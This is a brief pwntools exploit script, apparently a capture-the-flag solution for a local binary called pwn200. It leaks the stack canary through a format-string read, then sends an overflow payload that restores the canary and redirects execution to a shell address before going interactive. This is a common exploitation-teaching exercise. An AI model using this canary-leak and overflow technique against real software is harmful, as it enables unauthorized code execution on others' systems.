from pwn import *

io = process('../target/pwn200')

io.sendline("%15$x")
canary = int(io.recv(),16)
log.info("canary: 0x%x" %canary)

binsh = 0x080491a2
payload = b"A"*0x28+p32(canary)+b"A"*0x20+p32(binsh)
io.sendline(payload)
io.interactive()

